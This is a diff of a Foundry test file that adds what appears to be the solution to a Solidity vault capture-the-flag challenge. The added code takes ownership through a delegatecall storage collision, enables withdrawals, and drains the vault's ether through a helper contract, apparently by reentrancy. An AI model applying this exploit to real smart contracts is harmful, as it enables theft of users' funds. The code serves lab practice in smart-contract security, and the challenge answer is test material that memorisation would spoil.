@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "../src/Vault.sol";
+import "../src/MyVault.sol";
 
 
 
@@ -32,8 +33,23 @@ contract VaultExploiter is Test {
 
         // add your hacker code.
 
+        bytes32 callData = bytes32(uint256(uint160(address(logic))));
+        address(vault).call(abi.encodeWithSelector(VaultLogic.changeOwner.selector, callData, palyer));
+        vault.openWithdraw();
+
+        MyVault myVault = new MyVault(palyer);
+        payable(address(myVault)).transfer(0.1 ether);
+        vm.stopPrank();
+
+        vm.startPrank(address(myVault));
+        vault.deposite{value: 0.1 ether}();
+        vault.withdraw();
         require(vault.isSolve(), "solved");
         vm.stopPrank();
+
+        vm.prank(palyer);
+        myVault.withdraw(); 
+        assertEq(1.1 ether, palyer.balance);
     }
 
 }
